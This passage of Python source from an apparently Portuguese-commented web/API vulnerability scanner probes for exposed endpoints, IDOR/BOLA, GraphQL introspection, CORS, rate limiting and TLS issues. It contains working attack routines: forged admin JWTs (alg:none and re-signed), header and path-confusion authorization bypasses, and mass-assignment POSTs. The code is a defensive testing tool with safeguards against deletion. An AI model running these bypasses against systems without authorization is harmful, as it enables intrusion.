        bag.add(Finding(host, "info_disclosure", "LOW", "JWT com claims sensiveis/privilegio",
                        ", ".join(sensitive[:8]), url, str(vals)[:120], method="JWT", curl=jwt_curl))
    exp = payload.get("exp")
    if isinstance(exp, (int, float)) and exp < time.time():
        bag.add(Finding(host, "info_disclosure", "INFO", "JWT expirado exposto", "", url,
                        f"exp={int(exp)}", method="JWT", curl=jwt_curl))


def scan_excessive_data(host, url, body, bag, method="GET"):
    """Detecta campos sensiveis em respostas JSON (excessive data exposure - API3)."""
    if not body or body.lstrip()[:1] not in ("{", "["):
        return
    fields = sorted(set(m.group(1).lower() for m in EXCESSIVE_FIELDS.finditer(body)))
    if fields:
        bag.add(Finding(host, "sensitive_data", "MEDIUM",
                        "Excessive data exposure (campos sensiveis na resposta da API)",
                        f"campos: {', '.join(fields[:10])}", url,
                        ", ".join(fields[:6]), method=method))


def probe_api(sess, host, base, entry, opts, bag, discovered_swagger, api_eps, jwt_ctx):
    path, desc = entry
    url = base + path
    r = do_request(sess, "GET", url, opts, allow_redirects=False)
    if r is None:
        return
    status = r.status_code
    ctype = r.headers.get("Content-Type", "").lower()
    body = read_body(r, 20000)
    set_cookie = r.headers.get("Set-Cookie", "")

    # registra endpoint p/ testes profundos (auth bypass, shadow, CORS)
    if status in (200, 206, 401, 403, 405, 500):
        api_eps.append({"url": url, "path": path, "status": status, "json": "json" in ctype})

    # High-value endpoints
    if path in API_HIGH_VALUE and status in (200, 206):
        hv_sev, hv_cat, hv_desc = API_HIGH_VALUE[path]
        if not is_false_hit(sess, path, body, r):
            clen = r.headers.get("Content-Length") or str(len(r.content))
            bag.add(Finding(host, hv_cat, hv_sev, hv_desc, f"Acessivel: {path}", url,
                            f"HTTP {status}, {clen} bytes"))
            scan_body_for_secrets(host, url, body, bag, in_file=True)

    # Swagger/OpenAPI JSON detectado
    is_json = "json" in ctype or (body.strip()[:1] in ("{", "["))
    if status == 200 and is_json and any(k in path for k in ("swagger", "openapi", "api-docs")):
        if '"swagger"' in body or '"openapi"' in body or '"paths"' in body:
            bag.add(Finding(host, "info_disclosure", "MEDIUM",
                            "Especificacao Swagger/OpenAPI exposta",
                            f"Spec em {path}", url, f"HTTP {status}"))
            discovered_swagger.append((url, body))
            return

    # Endpoints de API respondendo JSON
    if status in (200, 206) and is_json and path not in API_HIGH_VALUE:
        if not is_false_hit(sess, path, body, r):
            bag.add(Finding(host, "info_disclosure", "LOW",
                            f"Endpoint de API acessivel (JSON): {desc}",
                            f"{path}", url, f"HTTP {status}, {ctype[:30]}"))
            scan_body_for_secrets(host, url, body, bag)
            scan_body_for_errors(host, url, body, bag)
            scan_excessive_data(host, url, body, bag)
            scan_jwts(host, url, body, opts, bag,
                      extra_tokens=JWT_RE.findall(set_cookie), ctx=jwt_ctx)
    elif status in (401, 403) and opts["verbose"] >= 2:
        vlog(opts, 2, f"      {C.DIM}(protegido {status}) {path}{C.RESET}")


def scan_api(sess, host, base, opts, bag, api_eps, jwt_ctx):
    vlog(opts, 1, f"  {C.BLUE}> descoberta de rotas de API ({len(API_PATHS)} paths){C.RESET}")
    discovered_swagger = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(lambda e: probe_api(sess, host, base, e, opts, bag, discovered_swagger, api_eps, jwt_ctx), API_PATHS))
    for spec_url, body in discovered_swagger:
        parse_openapi(sess, host, base, spec_url, body, opts, bag, api_eps, jwt_ctx)


def enum_api_endpoints(sess, host, base, api_eps, opts, bag, jwt_ctx):
    """Enumeracao ATIVA de endpoints de API: brute de recursos nas raizes + BOLA por IDs."""
    if opts["no_api_enum"]:
        return
    roots = set(API_ROOTS)
    for e in list(api_eps):
        m = re.match(r"(/api(?:/v\d+)?|/rest(?:/v\d+)?|/v\d+|/wp-json/wp/v\d+)", e["path"])
        if m:
            roots.add(m.group(1))
    combos = [(root, res) for root in sorted(roots) for res in API_RESOURCE_WORDLIST]
    vlog(opts, 1, f"  {C.BLUE}> enumeracao de API ({len(roots)} raizes x {len(API_RESOURCE_WORDLIST)} recursos){C.RESET}")
    lock = threading.Lock()

    def probe(item):
        root, res = item
        path = f"{root}/{res}"
        url = base + path
        r = do_request(sess, "GET", url, opts, allow_redirects=False)
        if r is None:
            return
        st = r.status_code
        ctype = r.headers.get("Content-Type", "").lower()
        if st in (200, 206, 401, 403):
            with lock:
                api_eps.append({"url": url, "path": path, "status": st, "json": "json" in ctype})
        if st in (200, 206):
            body = read_body(r, 20000)
            is_json = "json" in ctype or body.lstrip()[:1] in ("{", "[")
            if not is_json or is_false_hit(sess, path, body, r):
                return
            bag.add(Finding(host, "info_disclosure", "LOW",
                            f"Endpoint de API enumerado acessivel: {path}", "", url,
                            f"HTTP {st}, {ctype[:30]}"))
            scan_body_for_secrets(host, url, body, bag)
            scan_excessive_data(host, url, body, bag)
            scan_jwts(host, url, body, opts, bag, ctx=jwt_ctx)
        # 401/403 NAO sao reportados: sao coletados em api_eps e passam pelo bypass
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(probe, combos))
    test_bola_ids(sess, host, base, api_eps, opts, bag)


def test_bola_ids(sess, host, base, api_eps, opts, bag):
    """IDOR/BOLA: para endpoints /.../{numero}, enumera IDs vizinhos e compara respostas."""
    seen_prefix = set()
    candidates = []
    for e in list(api_eps):
        m = re.search(r"^(.*/)(\d+)/?$", e["path"])
        if m and e["status"] in (200, 206) and m.group(1) not in seen_prefix:
            seen_prefix.add(m.group(1))
            candidates.append((m.group(1), int(m.group(2))))

    def test(item):
        prefix, orig = item
        results = {}
        for i in (0, 1, 2, 3, orig - 1, orig + 1):
            if i < 0:
                continue
            r = do_request(sess, "GET", base + prefix + str(i), opts)
            if r is not None and r.status_code in (200, 206):
                b = read_body(r, 4000)
                if not is_false_hit(sess, prefix, b, r):
                    results[i] = b[:200]
        distinct = set(results.values())
        if len(results) >= 2 and len(distinct) >= 2:
            bag.add(Finding(host, "misconfig", "HIGH",
                            "Possivel IDOR/BOLA (enumeracao de IDs sem autenticacao)",
                            f"multiplos objetos acessiveis em {prefix}{{id}}",
                            base + prefix + "{id}", f"IDs acessiveis: {sorted(results)}"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(4, opts["path_threads"] // 2)) as ex:
        list(ex.map(test, candidates[:10]))


def _build_example_from_schema(schema, spec, depth=0):
    """Constroi um valor de exemplo a partir de um schema OpenAPI (para o request body)."""
    if not isinstance(schema, dict) or depth > 6:
        return "test"
    if "$ref" in schema:
        ref = schema["$ref"].split("/")[-1]
        comp = (spec.get("components", {}).get("schemas", {}) or
                spec.get("definitions", {}))
        return _build_example_from_schema(comp.get(ref, {}), spec, depth + 1)
    for k in ("example", "default"):
        if k in schema:
            return schema[k]
    if "enum" in schema and schema["enum"]:
        return schema["enum"][0]
    t = schema.get("type")
    if t == "object" or "properties" in schema:
        obj = {}
        for pname, pschema in list(schema.get("properties", {}).items())[:15]:
            obj[pname] = _build_example_from_schema(pschema, spec, depth + 1)
        return obj
    if t == "array":
        return [_build_example_from_schema(schema.get("items", {}), spec, depth + 1)]
    if t in ("integer", "number"):
        return 1
    if t == "boolean":
        return True
    return "test"


def _endpoint_requires_auth(spec, operation):
    """True se o endpoint/spec declara requisito de seguranca."""
    if isinstance(operation, dict) and "security" in operation:
        return bool(operation["security"])
    return bool(spec.get("security"))


def parse_openapi(sess, host, base, spec_url, body, opts, bag, api_eps, jwt_ctx):
    try:
        spec = json.loads(body)
    except Exception:
        return
    paths = spec.get("paths", {})
    if not isinstance(paths, dict) or not paths:
        return
    base_path = ""
    if isinstance(spec.get("basePath"), str):
        base_path = spec["basePath"].rstrip("/")
    has_global_sec = bool(spec.get("security"))
    vlog(opts, 1, f"  {C.BLUE}> Swagger/OpenAPI: {len(paths)} rotas declaradas em {spec_url}{C.RESET}")
    write_methods = {"post", "put", "patch"}  # DELETE nunca e executado (seguranca)
    ops = []
    for raw_path, methods in list(paths.items())[:150]:
        full = base_path + raw_path
        if not full.startswith("/"):
            full = "/" + full
        if not isinstance(methods, dict):
            continue
        for method, operation in methods.items():
            if method.lower() not in ("get", "post", "put", "patch", "delete", "head", "options"):
                continue
            ops.append((full, method.lower(), operation if isinstance(operation, dict) else {}))

    def test_op(item):
        full, method, operation = item
        test_path = re.sub(r"\{[^}]+\}", "1", full)
        url = base + test_path
        requires_auth = _endpoint_requires_auth(spec, operation) or has_global_sec
        is_write = method in write_methods
        # DELETE nunca e enviado; escrita so com --unsafe-methods; corpo MINIMO (uma linha)
        sent_write = is_write and opts["unsafe_methods"]
        if method == "delete" or (is_write and not opts["unsafe_methods"]):
            probe_method = "GET"  # verifica existencia/no-auth sem efeito colateral
            kwargs = {}
        else:
            probe_method = method.upper()
            kwargs = {"json": dict(SAFE_WRITE_BODY)} if is_write else {}
        r = do_request(sess, probe_method, url, opts, **kwargs)
        if r is None:
            return
        st = r.status_code
        if sent_write and st in (200, 201, 204):
            log_modification(host, probe_method, url,
                             f"{probe_method} aceito no endpoint da spec", bag, body=SAFE_WRITE_BODY)
        if st in (200, 206, 401, 403):
            api_eps.append({"url": url, "path": test_path, "status": st,
                            "json": "json" in r.headers.get("Content-Type", "").lower()})
        if st in (200, 201, 206):
            body2 = read_body(r, 20000)
            if is_false_hit(sess, test_path, body2, r):
                return
            if requires_auth:
                bag.add(Finding(host, "misconfig", "HIGH",
                                "Endpoint protegido acessivel SEM autenticacao (BOLA/BFLA)",
                                f"{method.upper()} {test_path} declara security mas responde {st}",
                                url, f"HTTP {st}", method=method.upper()))
            else:
                bag.add(Finding(host, "info_disclosure", "LOW",
                                "Rota de API (do Swagger) acessivel sem auth",
                                f"{method.upper()} {test_path}", url, f"HTTP {st}", method=method.upper()))
            scan_body_for_secrets(host, url, body2, bag)
            scan_body_for_errors(host, url, body2, bag)
            scan_excessive_data(host, url, body2, bag, method=method.upper())
            scan_jwts(host, url, body2, opts, bag, ctx=jwt_ctx)
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(test_op, ops))


def test_graphql(sess, host, base, opts, bag):
    for path in GRAPHQL_PATHS:
        url = base + path
        r = do_request(sess, "POST", url, opts, json=GRAPHQL_INTROSPECTION,
                       headers={"Content-Type": "application/json"})
        if r is None:
            continue
        body = read_body(r, 60000)
        active = (r.status_code in (200, 400) and
                  ("graphql" in body.lower() or '"errors"' in body or '"data"' in body))
        introspection = r.status_code == 200 and ('"__schema"' in body or '"queryType"' in body)
        ct_json = {"Content-Type": "application/json"}
        if introspection:
            bag.add(Finding(host, "misconfig", "MEDIUM", "GraphQL introspection habilitada",
                            f"Schema exposto via introspection em {path}", url,
                            "__schema retornado", method="POST",
                            curl=_curl_repro(url, "POST", ct_json, GRAPHQL_INTROSPECTION)))
            scan_body_for_secrets(host, url, body, bag)
            # enumera mutations e destaca as perigosas
            rm = do_request(sess, "POST", url, opts, json=GRAPHQL_MUTATION_INTROSPECT,
                            headers={"Content-Type": "application/json"})
            if rm is not None:
                mbody = read_body(rm, 40000)
                dang = sorted(set(GRAPHQL_DANGEROUS_MUTATIONS.findall(mbody)))
                if dang:
                    bag.add(Finding(host, "misconfig", "MEDIUM",
                                    "GraphQL expoe mutations sensiveis",
                                    f"{len(dang)} mutation(s) perigosa(s)", url,
                                    ", ".join(dang[:8]), method="POST",
                                    curl=_curl_repro(url, "POST", ct_json, GRAPHQL_MUTATION_INTROSPECT)))
        elif active:
            bag.add(Finding(host, "info_disclosure", "LOW",
                            "Endpoint GraphQL ativo (introspection negada)",
                            f"{path}", url, f"HTTP {r.status_code}", method="POST"))
        scan_body_for_errors(host, url, body, bag, method="POST")

        if not (introspection or active):
            continue

        # Field suggestion (funciona mesmo com introspection off)
        rs = do_request(sess, "POST", url, opts, json=GRAPHQL_FIELD_SUGGEST,
                        headers={"Content-Type": "application/json"})
        if rs is not None:
            sbody = read_body(rs, 20000)
            sugg = re.findall(r'(?i)Did you mean ["\']?([A-Za-z0-9_]+)', sbody)
            if sugg:
                bag.add(Finding(host, "info_disclosure", "LOW",
                                "GraphQL field suggestion habilitado (enumera schema)",
                                f"sugere: {', '.join(sorted(set(sugg))[:8])}", url,
                                "erro sugere campos", method="POST"))

        # Batching / aliasing (potencial DoS - API4)
        rb = do_request(sess, "POST", url, opts, json=GRAPHQL_BATCH,
                        headers={"Content-Type": "application/json"})
        if rb is not None and rb.status_code == 200:
            bbody = read_body(rb, 20000)
            if bbody.lstrip().startswith("[") and bbody.count('"data"') >= 2:
                bag.add(Finding(host, "misconfig", "MEDIUM",
                                "GraphQL aceita batching de queries (risco de DoS)",
                                "array de queries processado em lote", url,
                                f"{bbody.count(chr(34)+'data'+chr(34))} respostas", method="POST",
                                curl=_curl_repro(url, "POST", ct_json, GRAPHQL_BATCH)))

        # CSRF: query via GET
        rg = do_request(sess, "GET", url + "?query=%7B__typename%7D", opts)
        if rg is not None and rg.status_code == 200 and '"__typename"' in read_body(rg, 8000):
            bag.add(Finding(host, "misconfig", "MEDIUM",
                            "GraphQL executa queries via GET (superficie de CSRF)",
                            "query aceita por GET", url + "?query={__typename}",
                            "HTTP 200 com data", method="GET"))


def _jwt_encode(payload, alg="none", secret=None):
    """Gera um JWT (para forjar tokens de bypass)."""
    def b64(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
    header = {"alg": alg if alg else "none", "typ": "JWT"}
    signing = f"{b64(header)}.{b64(payload)}"
    if alg == "none" or not secret:
        return signing + "."
    hashfn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
              "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), signing.encode(), hashfn).digest()).rstrip(b"=").decode()
    return f"{signing}.{sig}"


def _forged_jwts(jwt_ctx):
    now = int(time.time())
    payload = {"sub": "1", "user": "admin", "name": "admin", "role": "admin",
               "admin": True, "is_admin": True, "scope": "admin", "iat": now, "exp": now + 3600}
    forged = [("alg:none forjado", _jwt_encode(payload, "none"))]
    for sec in list(jwt_ctx.get("secrets", []))[:3]:
        forged.append((f"re-assinado c/ segredo '{sec or '(vazio)'}'",
                       _jwt_encode(payload, "HS256", sec)))
    for tok in list(jwt_ctx.get("tokens", []))[:2]:
        forged.append(("replay do token original", tok))
    return forged


REAL_HTTP_METHODS = {"GET", "POST", "PUT", "PATCH", "HEAD", "OPTIONS", "TRACE"}


def _curl_repro(url, method="GET", headers=None, data=None):
    """Monta um comando curl copiavel para reproduzir/validar o achado manualmente."""
    parts = ["curl -sk -i"]
    if method and method not in ("GET", "JWT", "TECH", "CVE"):
        parts.append(f"-X {method}")
    for k, v in (headers or {}).items():
        parts.append(f"-H '{k}: {v}'")
    if data is not None:
        d = data if isinstance(data, str) else json.dumps(data)
        d = d.replace("'", "'\\''")  # escapa aspas simples para o shell
        parts.append(f"-d '{d}'")
    parts.append(f"'{url}'")
    return " ".join(parts)


# Corpo minimo usado nos testes de escrita: modifica APENAS um campo (nunca deleta)
SAFE_WRITE_BODY = {"misconfig_probe": "scan"}


def log_modification(host, method, url, detail, bag, body=None):
    """Registra que o scan MODIFICOU um recurso (nunca deleta). O usuario deve reverter.
    'body' deve ser um dict (nao pre-serializado) para que o curl reproduza o JSON exato enviado."""
    hdrs = {"Content-Type": "application/json"} if body else None
    ev = f"{method} enviado" + (f" | corpo: {json.dumps(body)}" if body else "")
    bag.add(Finding(host, "modificacao", "HIGH",
                    "RECURSO MODIFICADO pelo scan (REVISAR e REVERTER manualmente)",
                    detail, url, ev, method=method, curl=_curl_repro(url, method, hdrs, body)))


def _real_bypass(sess, rb, url, opts):
    """True se a resposta de bypass parece acesso real (nao soft-404 / catch-all do host)."""
    if rb is None or rb.status_code not in (200, 206):
        return False
    body = read_body(rb, 8192)
    if is_false_hit(sess, urlparse(url).path, body, rb):
        return False
    return True


def attempt_bypass(sess, host, url, orig_status, opts, bag, jwt_ctx=None):
    """Tenta contornar um 401/403 (header, path confusion, JWT forjado).
    Reporta SOMENTE se o bypass conceder acesso real (200/206). Retorna True em caso de sucesso."""
    # 1. headers de bypass
    for hdr in AUTH_BYPASS_HEADERS:
        rb = do_request(sess, "GET", url, opts, headers=hdr)
        if _real_bypass(sess, rb, url, opts):
            hn = list(hdr.keys())[0]
            bag.add(Finding(host, "misconfig", "HIGH", "Bypass de autorizacao via header (403 contornado)",
                            f"{hn} -> {rb.status_code}", url,
                            f"{orig_status} sem header, {rb.status_code} com {hn}",
                            curl=_curl_repro(url, headers=hdr)))
            return True
    # 2. path confusion
    for suf in AUTH_BYPASS_SUFFIXES:
        rb = do_request(sess, "GET", url + suf, opts)
        if _real_bypass(sess, rb, url + suf, opts):
            bag.add(Finding(host, "misconfig", "HIGH", "Bypass de autorizacao via path confusion (403 contornado)",
                            f"sufixo '{suf}' -> {rb.status_code}", url + suf, f"original={orig_status}",
                            curl=_curl_repro(url + suf)))
            return True
    # 3. JWT forjado (se houver contexto)
    if jwt_ctx is not None:
        for label, tok in _forged_jwts(jwt_ctx):
            for hdr in ({"Authorization": f"Bearer {tok}"}, {"Cookie": f"token={tok}"},
                        {"Cookie": f"jwt={tok}"}, {"Cookie": f"session={tok}"}, {"X-Access-Token": tok}):
                rb = do_request(sess, "GET", url, opts, headers=hdr)
                if _real_bypass(sess, rb, url, opts):
                    hn = list(hdr.keys())[0]
                    bag.add(Finding(host, "misconfig", "CRITICAL",
                                    "Bypass de autenticacao via JWT forjado (403 contornado)",
                                    f"{label} concedeu acesso ({orig_status} -> {rb.status_code})",
                                    url, f"{hn}: {tok[:32]}...", method="JWT",
                                    curl=_curl_repro(url, headers=hdr)))
                    return True
    return False


def api_deep_tests(sess, host, base, api_eps, opts, bag, jwt_ctx):
    """Testes profundos de API: auth bypass, JWT bypass, shadow APIs, CORS/endpoint, rate limit."""
    if opts["no_api_deep"] or not api_eps:
        return
    # dedupe por url
    seen, eps = set(), []
    for e in api_eps:
        if e["url"] not in seen:
            seen.add(e["url"])
            eps.append(e)
    vlog(opts, 1, f"  {C.BLUE}> testes profundos de API ({len(eps)} endpoints): auth-bypass/shadow/CORS{C.RESET}")

    protected = [e for e in eps if e["status"] in (401, 403)]
    accessible = [e for e in eps if e["status"] in (200, 206)]
    vlog(opts, 1, f"  {C.BLUE}> tentando bypass em {len(protected)} endpoint(s) 403/401{C.RESET}")

    # 1. Auth bypass (header + path confusion + JWT forjado) nos protegidos
    def try_bypass(e):
        attempt_bypass(sess, host, e["url"], e["status"], opts, bag, jwt_ctx)

    # 2. Shadow / deprecated APIs (versionamento)
    shadow_targets = set()
    for e in eps:
        m = re.search(r"/(v\d+|internal|beta|alpha|legacy)/", e["path"])
        if m:
            for ver in API_SHADOW_VERSIONS:
                shadow_targets.add(base + e["path"].replace(m.group(0), f"/{ver}/", 1))
    shadow_targets -= {e["url"] for e in eps}

    def try_shadow(url):
        rb = do_request(sess, "GET", url, opts)
        if rb is None or rb.status_code not in (200, 206):
            return
        b = read_body(rb, 20000)
        if is_false_hit(sess, urlparse(url).path, b, rb):
            return
        bag.add(Finding(host, "info_disclosure", "MEDIUM",
                        "Shadow/deprecated API acessivel (versionamento)",
                        urlparse(url).path, url, f"HTTP {rb.status_code}"))
        scan_body_for_secrets(host, url, b, bag)
        scan_excessive_data(host, url, b, bag)

    # 3. CORS por endpoint de API (com credenciais = alto impacto)
    def try_cors(e):
        evil = "https://" + OOB_MARKER
        rb = do_request(sess, "GET", e["url"], opts, headers={"Origin": evil})
        if rb is None:
            return
        acao = rb.headers.get("Access-Control-Allow-Origin", "")
        acac = rb.headers.get("Access-Control-Allow-Credentials", "")
        if acao and (evil in acao or acao == "*"):
            cc = _curl_repro(e["url"], headers={"Origin": evil})
            if acac.lower() == "true" and acao != "*":
                bag.add(Finding(host, "misconfig", "HIGH",
                                "CORS reflete Origin arbitraria COM credenciais (API)",
                                "roubo de dados autenticados", e["url"], acao, method="GET", curl=cc))
            elif evil in acao:
                bag.add(Finding(host, "misconfig", "MEDIUM",
                                "CORS reflete Origin arbitraria (endpoint de API)",
                                f"credentials={acac or 'false'}", e["url"], acao, method="GET", curl=cc))

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(4, opts["path_threads"] // 2)) as ex:
        list(ex.map(try_bypass, protected[:40]))
        list(ex.map(try_shadow, list(shadow_targets)[:60]))
        list(ex.map(try_cors, accessible[:30]))

    # 4. Mass assignment (so com --unsafe-methods, pois faz POST com corpo)
    if opts["unsafe_methods"]:
        test_mass_assignment(sess, host, base, accessible, opts, bag)

    # 5. Rate limit em endpoints de autenticacao
    if not opts["no_ratelimit"]:
        test_rate_limit(sess, host, base, opts, bag)


def test_mass_assignment(sess, host, base, accessible, opts, bag):
    """Envia campos privilegiados (role/is_admin) e verifica se sao aceitos/refletidos (API3).
    Escrita minima (nunca deleta); registra o recurso modificado."""
    targets = [e for e in accessible if e["json"]][:15]
    for e in targets:
        r = do_request(sess, "POST", e["url"], opts, json=MASS_ASSIGN_PAYLOAD,
                       headers={"Content-Type": "application/json"})
        if r is None or r.status_code not in (200, 201):
            continue
        # POST aceito = recurso possivelmente criado/modificado -> registra para reverter
        log_modification(host, "POST", e["url"], "POST de mass assignment aceito", bag,
                         body=MASS_ASSIGN_PAYLOAD)
        body = read_body(r, 20000)
        # se a resposta ecoa nosso valor privilegiado, provavel mass assignment
        if ('"role"' in body and "admin" in body) or '"is_admin": true' in body.replace(" ", " ") \
                or '"isAdmin":true' in body.replace(" ", "") or '"is_admin":true' in body.replace(" ", ""):
            bag.add(Finding(host, "misconfig", "HIGH",
                            "Possivel mass assignment (campo privilegiado aceito)",
                            "resposta refletiu role/is_admin injetado", e["url"],
                            f"HTTP {r.status_code}", method="POST",
                            curl=_curl_repro(e["url"], "POST", {"Content-Type": "application/json"},
                                             MASS_ASSIGN_PAYLOAD)))


def test_rate_limit(sess, host, base, opts, bag):
    """Envia rajada de requests a endpoints de auth; ausencia de 429 = sem rate limit (API4)."""
    for path in ("/api/login", "/login", "/api/auth", "/api/token", "/oauth/token"):
        url = base + path
        r0 = do_request(sess, "POST", url, opts, json={"username": "x", "password": "y"},
                        headers={"Content-Type": "application/json"})
        if r0 is None or r0.status_code in (404, 405):
            continue
        # endpoint de login inexistente (host catch-all) -> nao e um /login real
        if is_false_hit(sess, path, read_body(r0, 8192), r0):
            continue
        codes = []
        for _ in range(18):
            rr = do_request(sess, "POST", url, opts, json={"username": "x", "password": "y"},
                            headers={"Content-Type": "application/json"})
            if rr is not None:
                codes.append(rr.status_code)
        if codes and 429 not in codes:
            loop_curl = (f"for i in $(seq 20); do curl -sk -o /dev/null -w '%{{http_code}} ' "
                         f"-X POST -H 'Content-Type: application/json' "
                         f"-d '{{\"username\":\"x\",\"password\":\"y\"}}' '{url}'; done   "
                         f"# se nunca aparecer 429, nao ha rate limit")
            bag.add(Finding(host, "misconfig", "MEDIUM",
                            "Ausencia de rate limiting em endpoint de autenticacao",
                            f"{len(codes)+1} POSTs sem 429 em {path}", url,
                            f"status observados: {sorted(set(codes))}", method="POST",
                            curl=loop_curl))
        return  # um endpoint de auth basta


def test_post_endpoints(sess, host, base, opts, bag):
    """POST com corpos variados para forcar erros/stack traces e info disclosure."""
    vlog(opts, 1, f"  {C.BLUE}> testes via POST ({len(POST_TEST_PATHS)} endpoints){C.RESET}")
    bodies = [
        ("json_empty", {"headers": {"Content-Type": "application/json"}, "data": "{}"}),
        ("json_malformed", {"headers": {"Content-Type": "application/json"}, "data": "{invalid:"}),
        ("form_probe", {"data": {"username": "test'\"", "password": "x", "email": "a@b.c"}}),
    ]
    def test_ep(path):
        url = base + path
        for label, kw in bodies:
            r = do_request(sess, "POST", url, opts, **kw)
            if r is None:
                continue
            body = read_body(r, 30000)
            # procura erros/stack traces revelados pelo POST
            before = len(bag.items)
            scan_body_for_errors(host, url, body, bag, method="POST")
            scan_body_for_secrets(host, url, body, bag)
            # HTTP 500 (Internal Server Error) indica excecao nao tratada;
            # 501/502/503/504 (metodo/gateway) NAO sao sinal util e geram ruido.
            if r.status_code == 500:
                bag.add(Finding(host, "info_disclosure", "LOW",
                                "POST retornou HTTP 500 (excecao nao tratada)",
                                f"corpo '{label}' causou erro", url,
                                f"HTTP {r.status_code}", method="POST"))
            # se um novo achado de erro surgiu, nao precisa testar mais corpos
            if len(bag.items) > before:
                break
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(4, opts["path_threads"] // 2)) as ex:
        list(ex.map(test_ep, POST_TEST_PATHS))


def test_verb_tampering(sess, host, base, opts, bag):
    """Para paths que negam GET (401/403), tenta outros metodos.
    IMPORTANTE: OPTIONS/HEAD sao EXCLUIDOS (preflight/HEAD dao 200 sem ser bypass real).
    PUT/PATCH so com --unsafe-methods. DELETE NUNCA e enviado."""
    targets = ["/admin", "/api/admin", "/api/users", "/api/config", "/actuator/env",
               "/manager/html", "/api/internal", "/api/private"]
    methods = ["POST"]
    if opts["unsafe_methods"]:
        methods += ["PUT", "PATCH"]  # DELETE nunca e enviado (seguranca)

    def test_ep(path):
        url = base + path
        rg = do_request(sess, "GET", url, opts)
        if rg is None or rg.status_code not in (401, 403):
            return
        base_status = rg.status_code
        for method in methods:
            rm = do_request(sess, method, url, opts)
            if rm is None or rm.status_code not in (200, 201):
                continue
            body = read_body(rm, 8192)
            low = body.lower()
            if not body or "not allowed" in low or "not supported" in low:
                continue
            if is_false_hit(sess, path, body, rm):
                continue
            bag.add(Finding(host, "misconfig", "MEDIUM",
                            f"Metodo {method} retorna {rm.status_code} onde GET e negado (VERIFICAR)",
                            f"GET={base_status} mas {method}={rm.status_code}; confirme se realmente da acesso",
                            url, f"{method} -> {rm.status_code}", method=method,
                            curl=_curl_repro(url, method=method), confidence="baixa"))
            break
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(4, opts["path_threads"] // 2)) as ex:
        list(ex.map(test_ep, targets))


def check_git_exposure(sess, host, base, opts, bag):
    """Se .git/config existe, tenta confirmar conteudo real do repo."""
    vlog(opts, 1, f"  {C.BLUE}> confirmacao de repositorio .git{C.RESET}")
    url = base + "/.git/config"
    r = do_request(sess, "GET", url, opts)
    if r is None or r.status_code != 200:
        return
    body = read_body(r, 8192)
    if "[core]" in body or "[remote" in body or "repositoryformatversion" in body:
        remote = ""
        m = re.search(r"url\s*=\s*(\S+)", body)
        if m:
            remote = m.group(1)
        bag.add(Finding(host, "sensitive_data", "HIGH",
                        "Repositorio .git exposto e confirmado (codigo-fonte)",
                        f"remote: {remote}" if remote else "config valido", url,
                        body[:120]))


def check_tls(host, opts, bag):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, 443), timeout=opts["timeout"]) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                der = ssock.getpeercert(binary_form=True)
                version = ssock.version()
    except Exception:
        return
    if version in ("TLSv1", "TLSv1.1", "SSLv3"):
        bag.add(Finding(host, "misconfig", "MEDIUM",
                        f"Protocolo TLS legado suportado ({version})", "",
                        f"https://{host}", version))
    try:
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
        c = x509.load_der_x509_certificate(der, default_backend())
        not_after = c.not_valid_after_utc if hasattr(c, "not_valid_after_utc") \
            else c.not_valid_after.replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        days = (not_after - now).days
        subj = c.subject.rfc4514_string()
        issuer = c.issuer.rfc4514_string()
        if days < 0:
            bag.add(Finding(host, "misconfig", "HIGH", "Certificado TLS expirado",
                            f"Expirou ha {abs(days)} dias", f"https://{host}"))
        elif days < 15:
            bag.add(Finding(host, "misconfig", "LOW", "Certificado TLS proximo do vencimento",
                            f"Expira em {days} dias", f"https://{host}"))
        if subj == issuer:
            bag.add(Finding(host, "misconfig", "MEDIUM", "Certificado TLS self-signed",
                            f"subject == issuer ({subj[:60]})", f"https://{host}"))
    except ImportError:
        pass
    except Exception:
        pass


# --------------------------------------------------------------------------- #
# DNS / recon
# --------------------------------------------------------------------------- #
def _hostname_of(host):
    return host.split(":")[0]


def _is_ip(h):
    try:
        socket.inet_aton(h)
        return True
    except OSError:
        return ":" in h  # IPv6 (aproximado)


_SLD = {"co", "com", "net", "org", "gov", "edu", "ac", "or", "ne", "go"}


def _apex(hostname):
    parts = hostname.split(".")
    if len(parts) <= 2:
        return hostname
    if len(parts) >= 3 and parts[-2] in _SLD and len(parts[-1]) == 2:
        return ".".join(parts[-3:])
    return ".".join(parts[-2:])


def dns_recon(host, opts, bag):
    if opts["no_dns"] or not HAVE_DNS:
        return
    hostname = _hostname_of(host)
    if _is_ip(hostname):
        return
    vlog(opts, 1, f"  {C.BLUE}> DNS recon (CNAME/SPF/DMARC/AXFR/takeover){C.RESET}")
    res = dns.resolver.Resolver()
    res.lifetime = max(3.0, opts["timeout"])
    res.timeout = max(3.0, opts["timeout"])
    info = {"cname": None, "a": []}
    try:
        ans = res.resolve(hostname, "CNAME")
        info["cname"] = str(ans[0].target).rstrip(".")
        vlog(opts, 2, f"      {C.DIM}CNAME {hostname} -> {info['cname']}{C.RESET}")
    except Exception:
        pass
    try:
        ans = res.resolve(hostname, "A")
        info["a"] = [r.address for r in ans]
    except Exception:
        pass
    check_subdomain_takeover(host, info, opts, bag)
    check_email_security(hostname, res, opts, bag)
    try_zone_transfer(hostname, res, opts, bag)


def check_subdomain_takeover(host, dnsinfo, opts, bag):
    cname = dnsinfo.get("cname")
    if not cname:
        return
    low_cname = cname.lower()
    for service, cname_sub, sig in TAKEOVER_FINGERPRINTS:
        if cname_sub in low_cname:
            confirmed = False
            if sig:
